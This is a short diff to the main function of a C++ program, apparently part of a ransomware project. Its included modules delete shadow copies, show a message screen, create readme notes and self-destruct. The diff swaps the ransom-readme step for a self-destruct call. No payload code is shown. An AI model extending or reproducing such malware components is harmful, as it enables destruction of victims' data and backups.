@@ -6,6 +6,7 @@
 #include "del_shadows.h"
 #include "msg_screen.h"
 #include "create_readmes.h"
+#include "self_dest.h"
 
 
 /*
@@ -15,9 +16,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 */
 
 int main() {
-    std::string text = "This is the text to write to the file.";
-    std::string filename = "behemoth_readme.txt";
-    create_readmes(text, filename);
+    self_destruct();
     return 0;
 }
 
